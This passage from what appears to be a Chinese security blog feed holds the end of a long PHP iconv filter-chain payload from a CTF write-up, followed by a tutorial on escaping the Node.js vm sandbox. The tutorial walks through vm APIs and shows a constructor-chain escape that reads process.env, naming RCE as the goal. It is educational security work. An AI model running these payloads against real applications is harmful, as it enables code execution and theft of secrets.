class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="type">convert</span>.iconv<span class="number">.855</span>.CP936|<span class="type">convert</span>.iconv.IBM<span class="number">-932.</span>UTF<span class="number">-8</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.IBM869.UTF16|<span class="type">convert</span>.iconv.L3.CSISO90|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.iconv.CSA_T500.L4|<span class="type">convert</span>.iconv.ISO_8859<span class="number">-2.</span>ISO-IR<span class="number">-103</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.863</span>.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.ISO6937.UTF16LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.ISO88594.UTF16|<span class="type">convert</span>.iconv.IBM5347.UCS4|<span class="type">convert</span>.iconv.UTF32BE.MS936|<span class="type">convert</span>.iconv.OSF00010004.T<span class="number">.61</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L4.UTF32|<span class="type">convert</span>.iconv.CP1250.UCS<span class="number">-2</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP367.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.CP1361|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.IBM869.UTF16|<span class="type">convert</span>.iconv.L3.CSISO90|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.BIG5HKSCS.UTF16|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.BIG5HKSCS.UTF16|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CSGB2312.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.IBM<span class="number">-1161.</span>IBM932|<span class="type">convert</span>.iconv.GB13000.UTF16BE|<span class="type">convert</span>.iconv<span class="number">.864</span>.UTF<span class="number">-32</span>LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="type">convert</span>.iconv.CP1163.CSA_T500|<span class="type">convert</span>.iconv.UCS<span class="number">-2.</span>MSCP949|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L4.UTF32|<span class="type">convert</span>.iconv.CP1250.UCS<span class="number">-2</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.UTF8.UTF16LE|<span class="type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.iconv.UTF16.EUCTW|<span class="type">convert</span>.iconv.ISO<span class="number">-8859</span><span class="number">-14.</span>UCS2|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L4.UTF32|<span class="type">convert</span>.iconv.CP1250.UCS<span class="number">-2</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.863</span>.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.ISO6937.UTF16LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.864</span>.UTF32|<span class="type">convert</span>.iconv.IBM912.NAPLPS|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.iconv.GBK.BIG5|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.865</span>.UTF16|<span class="type">convert</span>.iconv.CP901.ISO6937|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP-AR.UTF16|<span class="type">convert</span>.iconv<span class="number">.8859</span>_4.BIG5HKSCS|<span class="type">convert</span>.iconv.MSCP1361.UTF<span class="number">-32</span>LE|<span class="type">convert</span>.iconv.IBM932.UCS<span class="number">-2</span>BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.iconv.ISO6937<span class="number">.8859</span>_4|<span class="type">convert</span>.iconv.IBM868.UTF<span class="number">-16</span>LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L4.UTF32|<span class="type">convert</span>.iconv.CP1250.UCS<span class="number">-2</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="type">convert</span>.iconv<span class="number">.855</span>.CP936|<span class="type">convert</span>.iconv.IBM<span class="number">-932.</span>UTF<span class="number">-8</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.8859</span>_3.UTF16|<span class="type">convert</span>.iconv<span class="number">.863</span>.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP1046.UTF16|<span class="type">convert</span>.iconv.ISO6937.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP1046.UTF32|<span class="type">convert</span>.iconv.L6.UCS<span class="number">-2</span>|<span class="type">convert</span>.iconv.UTF<span class="number">-16</span>LE.T<span class="number">.61</span><span class="number">-8</span>BIT|<span class="type">convert</span>.iconv<span class="number">.865</span>.UCS<span class="number">-4</span>LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.MAC.UTF16|<span class="type">convert</span>.iconv.L8.UTF16BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="type">convert</span>.iconv.ISO-IR<span class="number">-156.</span>JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.iconv.IBM932.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.base64-decode/resource=php://temp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTFwp及复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp及复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vm沙箱逃逸</title>
      <link href="/2024/04/06/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/04/06/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="vm沙箱逃逸"><a href="#vm沙箱逃逸" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h1><p>在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。</p><h3 id="Node将字符串执行为代码"><a href="#Node将字符串执行为代码" class="headerlink" title="Node将字符串执行为代码"></a>Node将字符串执行为代码</h3><p>我们先来看两个在node中将把字符串执行成代码的方式</p><h4 id="方法一：eval"><a href="#方法一：eval" class="headerlink" title="方法一：eval"></a>方法一：eval</h4><p>我们现在当前目录创建age.txt，写入</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var age <span class="operator">=</span> <span class="number">18</span></span><br></pre></td></tr></table></figure><p>然后创建1.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;age.txt&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(content)</span><br><span class="line"><span class="built_in">eval</span>(content)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age)</span><br></pre></td></tr></table></figure><p>以上代码的分析如下</p><blockquote><ol><li><code>const fs = require(&#39;fs&#39;)</code>: 导入Node.js的文件系统模块，以便读取文件内容。</li><li><code>let content = fs.readFileSync(&#39;age.txt&#39;, &#39;utf-8&#39;)</code>: 使用 <code>let</code> 关键字声明一个变量<code>content</code>，<code>readFileSync</code>是 <code>fs</code> 模块提供的同步读取文件内容的函数。它接受两个参数：第一个表示要读取的文件路径，第二个表示文件的编码格式</li><li><code>content``console.log(content)</code>: 将文件内容输出到控制台，用于调试目的。</li><li><code>eval(content)</code>: 使用 <code>eval()</code> 函数执行文件内容，即执行其中的JavaScript代码。<code>eval()</code> 函数将字符串作为JavaScript代码执行。</li><li><code>console.log(age)</code>: 输出变量 <code>age</code> 的值到控制台。这假设文件中的JavaScript代码定义了一个变量 <code>age</code></li></ol></blockquote><p>最后输出18</p><p>如果当前作用域下有相同变量名，会发生什么，我们修改代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;age.txt&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> age= <span class="number">20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(content)</span><br><span class="line"><span class="built_in">eval</span>(content)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age)</span><br></pre></td></tr></table></figure><p>结果是出现报错</p><p><img src="/img/image-20240329195706379.png" alt="image-20240329195706379"></p><p>在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题</p><h4 id="方法二：new-Function"><a href="#方法二：new-Function" class="headerlink" title="方法二：new Function"></a>方法二：new Function</h4><p>方法一由于不同模块作用域被限制了使用，那我们可以自己创造作用域来正常使用；new Function的第一个参数是形参名称，第二个参数是函数体。</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let age= <span class="number">20</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">add</span> = <span class="keyword">new</span> <span class="keyword">Function</span><span class="params">(<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;return age+1&#x27;</span>)</span></span><br><span class="line"><span class="title function_">console</span>.<span class="title function_">log</span><span class="params">(<span class="keyword">add</span>(age)</span>)</span><br></pre></td></tr></table></figure><p>以上代码分析</p><blockquote><p>这段代码首先声明了一个变量 age，其值为 20。然后使用了 new Function 构造函数创建了一个新的函数 add，该函数接受一个参数 age，并返回 age + 1 的结果。最后，调用这个函数，并将 age 变量作为参数传递给它，打印出返回的结果。</p></blockquote><p>函数内和函数外是两个作用域，当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就显的麻烦</p><p>以上例子可以看出来其实我们的思想就是如何创建一个能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域，这也就是vm模块的作用。</p><h3 id="Nodejs作用域"><a href="#Nodejs作用域" class="headerlink" title="Nodejs作用域"></a>Nodejs作用域</h3><p>在Node中一般把作用域叫上下文</p><p>我们在写一个Node项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在1.js中require了2.js，那么我在1.js中也无法直接调用2.js中的变量和函数，例如在同一级目录下，有1.js和2.js两个文件</p><p>1.js</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var age <span class="operator">=</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><p>2.js</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const <span class="keyword">a</span> = <span class="built_in">require</span>(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line">console.<span class="built_in">log</span>(<span class="keyword">a</span>.age)</span><br></pre></td></tr></table></figure><p> 因为此时age已经挂载在global上了，它的作用域已经不在1中了</p><h3 id="vm沙箱逃逸-1"><a href="#vm沙箱逃逸-1" class="headerlink" title="vm沙箱逃逸"></a>vm沙箱逃逸</h3><blockquote><p>想要实现沙箱的隔离作用，我们可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。</p></blockquote><ul><li>vm.runinThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</li></ul><p><img src="/img/image-20240330162744047.png" alt="image-20240330162744047"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> localVar = <span class="string">&#x27;initial value&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> vmResult = vm.<span class="title function_">runInThisContext</span>(<span class="string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;vmResult:&#x27;</span>, vmResult);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;localVar:&#x27;</span>, localVar);</span><br><span class="line"><span class="comment">// vmResult: &#x27;vm&#x27;, localVar: &#x27;initial value&#x27;</span></span><br></pre></td></tr></table></figure><p>最后输出</p><p><img src="/img/image-20240330165024084.png" alt="image-20240330165024084"></p><p>以上代码解析</p><blockquote><ol><li>首先，使用 <code>require(&#39;vm&#39;)</code> 导入了 Node.js 的 <code>vm</code> 模块，该模块提供了虚拟机功能。</li><li>定义了一个变量 <code>localVar</code> 并初始化为 <code>&#39;initial value&#39;</code>。</li><li>使用 <code>vm.runInThisContext()</code> 方法在当前的上下文中执行了一段 JavaScript 代码 <code>&#39;localVar = &quot;vm&quot;;&#39;</code>。这段代码将变量 <code>localVar</code> 的值设置为 <code>&#39;vm&#39;</code>。这个方法的作用是在当前上下文中执行一段 JavaScript 代码字符串。</li><li>输出了执行结果 <code>vmResult</code> 和变量 <code>localVar</code> 的值。<code>vmResult</code> 的值是执行 <code>vm.runInThisContext()</code> 方法后的返回值，这里是执行的代码字符串本身，即 <code>&#39;vm&#39;</code>。<code>localVar</code> 的值仍然是初始值 <code>&#39;initial value&#39;</code>，因为虽然在虚拟机环境中改变了变量的值，但是并没有影响到外部作用域的变量值。</li></ol><p>简单来说就是<code>vm.runInThisContext()</code> 方法创造了一个sandbox，并在沙箱中将global作用域中的localVar的值改为vm，但是global作用域中的的localVar值没有影响。</p></blockquote><ul><li><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</li></ul><p><img src="/img/20221118183946-521c54fa-672d-1.png"></p><ul><li><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line">  <span class="variable language_">global</span>.<span class="property">globalVar</span> = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">const</span> sandbox = &#123; <span class="attr">globalVar</span>: <span class="number">1</span> &#125;;</span><br><span class="line">  vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">  vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox)); <span class="comment">// &#123; globalVar: 2 &#125;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(globalVar)); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>以上代码解析：</p><blockquote><ol><li>引入 <code>util</code> 和 <code>vm</code> 模块：<code>const util = require(&#39;util&#39;);</code> 和 <code>const vm = require(&#39;vm&#39;);</code>，用于后续的对象输出和创建沙盒环境。</li><li>定义全局变量 <code>globalVar</code>，并赋值为 <code>3</code>。</li><li>创建沙盒环境：<code>const sandbox = &#123; globalVar: 1 &#125;;</code>，这里定义了一个包含 <code>globalVar</code> 属性的对象，初始值为 <code>1</code>。</li><li>使用 <code>vm.createContext(sandbox);</code> 方法创建沙盒环境，将其作为参数传入，表示在该沙盒环境中执行后续的 JavaScript 代码。</li><li>使用 <code>vm.runInContext(&#39;globalVar *= 2;&#39;, sandbox);</code> 方法在沙盒环境中执行一段 JavaScript 代码，将 <code>globalVar</code> 的值乘以 <code>2</code>。</li><li>使用 <code>util.inspect(sandbox)</code> 方法将沙盒环境对象转换为字符串并输出，结果为 <code>&#123; globalVar: 2 &#125;</code>，表明沙盒环境中 <code>globalVar</code> 的值已经被修改为 <code>2</code>。</li><li>使用 <code>util.inspect(globalVar)</code> 方法输出全局变量 <code>globalVar</code> 的值，结果为 <code>3</code>，表明全局变量 <code>globalVar</code> 的值没有受到沙盒环境中代码的影响。</li></ol></blockquote><p>创建的这个sandbox沙箱对象无法访问global属性，所以值仍为3</p><ul><li><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</li><li><code>vm.Script类</code> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</li><li><code>new vm.Script(code, options)</code>：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。<br>code：要被解析的JavaScript代码</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line"><span class="attr">animal</span>: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line"><span class="attr">count</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox));</span><br><span class="line"><span class="comment">// &#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span></span><br></pre></td></tr></table></figure><p>以上代码解析：</p><blockquote><ol><li>引入 <code>util</code> 和 <code>vm</code> 模块：<code>const util = require(&#39;util&#39;);</code> 和 <code>const vm = require(&#39;vm&#39;);</code>，用于后续的对象输出和创建沙盒环境。</li><li>定义了一个包含两个属性的沙盒环境对象 <code>sandbox</code>，其中包含 <code>animal</code> 属性为 <code>&#39;cat&#39;</code>，<code>count</code> 属性为 <code>2</code>。</li><li>使用 <code>vm.Script</code> 类创建了一个 JavaScript 脚本对象 <code>script</code>，该脚本包含了一段 JavaScript 代码 <code>&#39;count += 1; name = &quot;kitty&quot;;&#39;</code>，用于对 <code>count</code> 属性进行增加操作，并给 <code>name</code> 属性赋值为 <code>&#39;kitty&#39;</code>。</li><li>使用 <code>vm.createContext</code> 方法创建了一个沙盒环境的上下文 <code>context</code>，将 <code>sandbox</code> 对象作为参数传入，表示在该沙盒环境中执行后续的 JavaScript 代码。</li><li>使用 <code>script.runInContext(context);</code> 方法在沙盒环境中运行之前定义的 JavaScript 脚本对象，即执行 <code>count += 1; name = &quot;kitty&quot;;</code> 这段代码。</li><li>使用 <code>util.inspect(sandbox)</code> 方法将沙盒环境对象转换为字符串并输出，结果为 <code>&#123; animal: &#39;cat&#39;, count: 3, name: &#39;kitty&#39; &#125;</code>，表明沙盒环境中 <code>count</code> 属性的值已经增加为 <code>3</code>，并且 <code>name</code> 属性的值也被修改为 <code>&#39;kitty&#39;</code>。</li></ol></blockquote><p>script对象可以通过runInXXXContext运行。</p><p>我们一般进行沙箱逃逸最后都是进行rce，那么在Node里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在<code>creatContext</code>后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p><p>如果我们把代码改成这样（code参数最好用反引号包裹，这样可以使code更严格便于执行）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1);</span><br></pre></td></tr></table></figure><p>上述代码解析：</p><blockquote><ol><li><code>&quot;use strict&quot;;</code>：这是 JavaScript 的严格模式声明，它使得在代码中采用一些不安全的语法和行为会引发错误，从而提高代码的健壮性和可维护性。</li><li><code>const vm = require(&quot;vm&quot;);</code>：引入 Node.js 的 <code>vm</code> 模块，用于创建沙盒环境。</li><li><code>vm.runInNewContext(code, sandbox)</code>：<code>runInNewContext</code> 方法是 <code>vm</code> 模块中的一个函数，用于在一个新的沙盒环境中执行指定的 JavaScript 代码 <code>code</code>。这里的 <code>code</code> 是一个字符串，表示要执行的 JavaScript 代码。<code>sandbox</code> 参数是一个对象，表示沙盒环境的上下文，可以在执行代码时使用。在本例中，将环境变量获取的代码作为字符串传入 <code>runInNewContext</code> 方法中。</li><li><code>this.constructor.constructor(&#39;return process.env&#39;)()</code>：这段代码利用了 JavaScript 中的一种特性——利用构造函数的构造函数来获取当前进程的环境变量。具体来说，<code>this.constructor</code> 表示当前的构造函数（<code>Object</code>），而 <code>this.constructor.constructor</code> 表示 <code>Object</code> 构造函数的构造函数（<code>Function</code>）。然后，通过调用 <code>Function</code> 构造函数，传入字符串 <code>&#39;return process.env&#39;</code>，来创建一个新的函数，该函数的作用是返回当前进程的环境变量。最后，通过 <code>()</code> 运算符调用这个新创建的函数，即执行获取环境变量的操作。</li><li><code>console.log(y1);</code>：输出获取到的环境变量。</li></ol></blockquote><p>最后输出</p><p><img 